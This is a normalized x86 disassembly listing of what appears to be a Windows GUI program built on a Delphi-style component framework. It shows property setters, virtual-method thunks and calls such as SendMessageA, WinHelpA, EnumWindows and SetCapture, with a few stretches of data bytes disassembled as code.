mov ecx [ eax + 0x210 ]
call sub_435a34
retn
sub_435b84
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_435a34
retn
sub_435c1c
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44c87c
sub_435c30
cmp dl [ eax + 0x21d ]
je r-xdata
retn
mov [ eax + 0x21d ] dl
call sub_44c87c
sub_435c44
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_435c58
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_435ef4
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x18 ]
retn
sub_435efc
push ebx
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_435ef4
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_436044
mov [ ebx + 0x2c ] 0x1
sub_435f1c
mov edx eax
call sub_435f24
retn
sub_435f68
push esi
mov esi eax
mov [ esi + 0x2d ] 0x0
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
call sub_418ccc
pop esi
retn
sub_435f84
cmp dl [ eax + 0xc ]
je r-xdata
retn
mov [ eax + 0xc ] dl
xor edx edx
call sub_418ccc
sub_435f94
cmp dl [ eax + 0xd ]
je r-xdata
retn
mov [ eax + 0xd ] dl
xor edx edx
call sub_418ccc
sub_435fcc
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
xor edx edx
call sub_418ccc
sub_435fdc
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
mov dl [ eax + 0xe ]
call sub_418ccc
sub_435ff0
cmp dl [ eax + 0xf ]
je r-xdata
retn
mov [ eax + 0xf ] dl
mov dl 0x1
call sub_418ccc
sub_436000
push ebx
mov ebx eax
cmp dl [ ebx + 0x10 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x10 ] dl
mov eax ebx
call sub_435ef4
mov dl [ eax + 0x235 ]
mov eax ebx
call sub_418ccc
sub_436024
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_418ccc
sub_436034
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_418ccc
sub_436044
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] edx
mov [ eax + 0x2c ] 0x0
xor edx edx
call sub_418ccc
sub_4360e4
mov al [ eax + 0x2c ]
xor al 0x1
retn
sub_4360ec
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
xor edx edx
call sub_418ccc
sub_4360fc
mov al [ eax + 0x2d ]
xor al 0x1
retn
sub_436104
push esi
mov esi eax
cmp dl [ esi + 0x2d ]
je r-xdata
pop esi
retn
mov [ esi + 0x2d ] dl
mov eax esi
mov si 0xfffc
call sub_40348c
sub_43611c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
xor edx edx
call sub_418ccc
sub_436170
push ebx
mov ebx eax
mov eax ebx
call sub_418ee0
pop ebx
retn
sub_4361c4
mov eax [ eax + 0x18 ]
retn
sub_436448
push ebx
mov ebx eax
mov eax ebx
call sub_44abb0
mov eax ebx
call sub_4372e4
pop ebx
retn
sub_4365d1
jmp sub_403a0c
sub_4367a8
jmp sub_403a0c
sub_4368d9
jmp sub_403a0c
sub_436985
jmp sub_403a0c
sub_43698c
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4369d4
push esi
mov esi eax
mov eax [ esi + 0x210 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4369e4
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_44c87c
sub_4369f8
cmp dl [ eax + 0x215 ]
je r-xdata
retn
mov [ eax + 0x215 ] dl
call sub_44c87c
sub_436a0c
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_44c87c
sub_436a20
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
call sub_44c87c
sub_436b38
cmp dl [ eax + 0x234 ]
je r-xdata
retn
mov [ eax + 0x234 ] dl
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4372e4
sub_436bb4
retn
sub_436c68
inc [ eax + 0x23c ]
retn
sub_436c70
dec [ eax + 0x23c ]
retn
sub_436cdc
push esi
mov esi eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_436dcf
jmp sub_403a0c
sub_43704e
jmp sub_403a0c
sub_437055
mov al [ ebp - 0xd ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43728f
jmp sub_403a0c
sub_43742f
jmp sub_403a0c
sub_4376a2
jmp sub_403a0c
sub_43773c
jmp sub_403a0c
sub_437743
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437b84
call sub_44d8c8
retn
sub_437c01
jmp sub_403a0c
sub_437d80
push ebx
mov ebx eax
mov eax ebx
call sub_44ea04
mov eax ebx
call sub_44c87c
pop ebx
retn
sub_437dc4
push esi
mov esi eax
mov eax esi
call sub_437060
test al al
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffb3
call sub_40348c
sub_437e67
jmp sub_403a0c
sub_43816d
jmp sub_403a0c
sub_438174
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438328
retn
sub_43842d
jmp sub_403a0c
sub_438434
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_438520
mov al [ eax + 0x244 ]
retn
sub_438528
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_438544
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_438560
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43857c
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_438615
jmp sub_403758
sub_438898
jmp sub_403a0c
sub_43889f
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4389d4
jmp sub_403a0c
sub_4389db
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_438c54
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x10
call sub_4341e0
sub_438c74
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_4341e0
sub_438c94
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x4
call sub_4341e0
sub_438f02
add [ eax ] al
call sub_44f2dc
retn
sub_439004
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_439018
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43902c
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_439040
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_439054
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_439070
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43908c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_4390a8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_439133
jmp sub_403a0c
sub_43913a
pop ebp
retn
sub_43913c
sub [ rw-data ] 0x1
retn
sub_4391ab
jmp [ edi ]
sub_43944c
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_439464
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_4394a8
push ebx
mov ebx eax
mov eax ebx
call sub_439bd0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_439bbf
jmp sub_403a0c
sub_439bd0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42be40
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_439478
sub_439c27
jmp sub_403a0c
sub_439c2e
pop ebp
retn
sub_439c30
sub [ rw-data ] 0x1
retn
sub_43a1e7
inc esp
add al bh
hlt
sub_43b8fd
inc esp
add al bh
hlt
sub_43c967
inc esp
add al bh
hlt
sub_43d008
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_43d2e3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x118d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43d69e
jmp sub_403a0c
sub_43d6a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d72a
jmp sub_403a0c
sub_43d731
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d738
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44bb9c
pop ebx
retn
sub_43d74c
push ebx
mov ebx eax
mov eax ebx
call sub_44e8f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44bb9c
pop ebx
retn
sub_43d768
push ebx
mov ebx eax
mov eax ebx
call sub_44d8c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43d814
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448af4
pop esi
pop ebx
retn
sub_43d97e
jmp sub_403a0c
sub_43d985
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43da94
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44abb0
mov eax ebx
mov si 0xffc7
call sub_40348c
pop esi
pop ebx
retn
sub_43db80
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43db9c
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40348c
sub_43dbb8
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43dbc4
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4207e4
sub_43dbd8
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43dc38
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43dcac
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40348c
pop esi
pop ebx
retn
sub_43dcc8
push esi
mov esi eax
mov eax esi
call sub_44a6bc
mov eax esi
mov si 0xffc7
call sub_40348c
pop esi
retn
sub_43dd6d
jmp sub_403a0c
sub_43dd74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43dd7c
push ebx
mov ebx eax
mov eax ebx
call sub_44a820
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43dda0
push ebx
mov ebx eax
mov eax ebx
call sub_44a838
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43ddc4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_43de46
jmp sub_403a0c
sub_43de4d
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43df38
jmp sub_403a0c
sub_43df3f
pop ebx
pop ecx
pop ebp
retn
sub_43e033
jmp sub_403a0c
sub_43e03a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e0b7
jmp sub_403a0c
sub_43e0be
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e214
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_448ad0
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_43e264
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_43e358
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_44c87c
sub_43e38c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_43e394
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_43e39c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_43e3c8
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_449ca8
sub_43e520
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43e7f7
jmp sub_403758
sub_43e7fc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43ea88
jmp sub_403a0c
sub_43ea8f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ea98
push ebx
mov ebx eax
mov eax ebx
call sub_448700
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_43eb65
jmp sub_403a0c
sub_43eb6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43eb78
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_43ebf4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43ed0e
jmp sub_403a0c
sub_43ed58
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_43ede3
jmp sub_403a0c
sub_43edea
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ee1c
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_43ee28
mov [ eax + 0x210 ] edx
retn
sub_43ee79
jmp sub_403a0c
sub_43ee80
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ef88
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_43ef9d
mov eax [ eax + 0x238 ]
retn
sub_43ef9d
push 0x0
xor ecx ecx
mov edx 0x154
call sub_449ca8
retn
sub_43f2dc
jmp sub_403a0c
sub_43f2e3
pop ebx
mov esp ebp
pop ebp
retn
sub_43f6a0
jmp sub_403a0c
sub_43f6a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f865
jmp sub_403a0c
sub_43f86c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f878
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_43fa5c
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43fa68
mov eax [ r-xdata ]
retn
sub_43fc99
jmp sub_403a0c
sub_43fca8
retn
sub_43fd5e
jmp sub_403a0c
sub_43fe08
mov eax [ r-xdata ]
retn
sub_43fe10
xor eax eax
retn
sub_43fe34
retn
sub_43ff4c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44c87c
sub_43ffc4
push ebx
mov ebx eax
mov eax ebx
call sub_45f870
test eax eax
je r-xdata
mov eax ebx
call sub_44a030
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_43ffe8
xor eax eax
retn
sub_4400af
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3e25173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4400c8
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40348c
sub_4401c2
jmp sub_403a0c
sub_4401c9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440374
push ebx
mov ebx eax
mov eax ebx
call sub_448700
mov eax ebx
call sub_44a030
pop ebx
retn
sub_440388
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_440394
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44c87c
sub_4403a8
test dl dl
je r-xdata
xor edx edx
call sub_4403bc
retn
mov dl 0x1
call sub_4403bc
retn
sub_440498
push ebx
mov ebx eax
mov eax ebx
call sub_44d8c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4404ac
call sub_44c87c
retn
sub_440542
jmp sub_403a0c
sub_440549
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440550
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_4405c0
mov al [ eax + 0x211 ]
retn
sub_4405f4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44c87c
sub_4407d4
call sub_44c87c
retn
sub_440851
jmp sub_403a0c
sub_440858
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440890
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_440970
jmp sub_403a0c
sub_440977
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440a03
jmp sub_403a0c
sub_440a0a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440b49
jmp sub_403a0c
sub_440b50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440be5
jmp sub_403a0c
sub_440bec
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440bf4
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_40348c
pop esi
retn
sub_440d32
jmp sub_403a0c
sub_440d54
jmp sub_403a0c
sub_440d5b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440d64
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_40348c
pop esi
retn
sub_440ece
jmp sub_403a0c
sub_440eeb
jmp sub_403a0c
sub_440ef2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4410a3
jmp sub_403a0c
sub_4410aa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4410f8
push esi
mov si 0xffb1
call sub_40348c
pop esi
retn
sub_441104
push esi
mov si 0xffb0
call sub_40348c
pop esi
retn
sub_441158
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4412c3
jmp sub_403a0c
sub_4412ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441414
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_441438
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_44150c
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_44c87c
sub_441524
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_44c87c
sub_441540
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44c87c
sub_441654
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_44c87c
sub_4416b4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_441778
jmp sub_403a0c
sub_44177f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44181a
jmp sub_403a0c
sub_441821
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441828
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44c87c
sub_441ec8
push ebx
mov ebx eax
mov eax ebx
call sub_44d8c8
mov eax ebx
call sub_441340
pop ebx
retn
sub_442048
jmp sub_403a0c
sub_44204f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442058
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_44246c
jmp sub_403a0c
sub_442473
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442550
jmp sub_403a0c
sub_442557
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442560
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_4425f1
jmp sub_403a0c
sub_4425f8
pop ebp
retn
sub_4425fc
sub [ rw-data ] 0x1
retn
sub_442759
jmp sub_403a0c
sub_442760
pop ebp
retn
sub_442764
sub [ rw-data ] 0x1
retn
sub_44276f
add bl bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_442fe4
sub_44277d
add eax 0xffffffe0
jmp sub_442d64
sub_442785
add eax 0xffffffe0
jmp sub_442dcc
sub_44278d
add eax 0xffffffe0
jmp sub_442ee0
sub_442795
add eax 0xffffffe0
jmp sub_442f54
sub_44279d
add eax 0xffffffe0
jmp sub_442a10
sub_4427a5
add eax 0xffffffe0
jmp sub_442a24
sub_4427ad
add eax 0xffffffe0
jmp sub_442a9c
sub_4427b5
add eax 0xffffffe0
jmp sub_442b40
sub_4427bd
add eax 0xffffffe0
jmp sub_442b44
sub_4427c5
add eax 0xffffffe0
jmp sub_442bcc
sub_4427cd
add eax 0xffffffe0
jmp sub_442d14
sub_4427d5
add eax 0xffffffe0
jmp sub_442d18
sub_4427dd
add eax 0xffffffe0
jmp sub_442d34
sub_4427ef
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405948
sub_4427f9
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40595c
sub_4429cd
jmp sub_403a0c
sub_4429d4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442a10
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40405c
pop ebx
retn
sub_442a8b
jmp sub_403a0c
sub_442a92
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442b24
jmp sub_403a0c
sub_442b2b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442b40
mov al 0x1
retn
sub_442bbf
jmp sub_403a0c
sub_442bc6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442cc4
jmp sub_403a0c
sub_442ccb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442d14
mov [ eax + 0xc ] edx
retn
sub_442d18
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_442dbc
jmp sub_403a0c
sub_442dc3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442ec2
jmp sub_403a0c
sub_442ec9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442f42
jmp sub_403a0c
sub_442f49
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442fd4
jmp sub_403a0c
sub_442fdb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4430cf
jmp sub_403a0c
sub_4430d6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_443198
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_4430e4
call EnumWindows
retn
sub_44322a
jmp sub_403a0c
sub_443231
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44323c
xor eax eax
retn
sub_443335
jmp sub_403a0c
sub_44333c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443426
jmp sub_403a0c
sub_44342d
pop ebp
retn
sub_443482
jmp sub_403a0c
sub_443489
pop ebp
retn
sub_444618
jmp r-xdata
sub_44461a
0xe8ffe9ff 0xe7ff
sub_444621
jmp esi
sub_445412
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44541f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_44542c
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_445439
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_445446
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_445453
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_445460
add eax 0xffffff8c
jmp sub_453084
sub_445472
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405948
sub_44547c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40595c
sub_4458d4
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_445be7
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417c34
retn
sub_445c04
push 0x15
mov ecx rw-data
call sub_417bf4
retn
sub_445c9c
call GetCapture
call sub_4459d4
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_445f00
push ebx
push eax
push sub_446084
call sub_421860
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_445f18
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_445f48
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421914
pop ebx
retn
sub_446026
jmp sub_403758
sub_446058
xor eax eax
retn
sub_44605c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
